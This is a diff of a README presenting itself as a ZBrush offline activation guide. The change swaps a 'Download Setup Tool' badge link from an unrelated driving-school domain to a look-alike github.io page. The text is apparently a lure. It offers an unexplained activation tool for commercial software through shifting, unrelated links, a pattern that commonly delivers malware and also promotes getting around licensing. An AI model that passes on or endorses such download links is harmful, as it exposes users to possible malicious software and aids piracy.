@@ -1,6 +1,6 @@
 # 🪷 ZBrush — Offline Activation Guide
 
-[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-teal)](https://dalahdrivingschool.com/)
+[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-teal)](https://zbrush-offline-activation-guide.github.io/.github)
 
 ## 🧰 How to Install & Activate ZBrush Offline
 
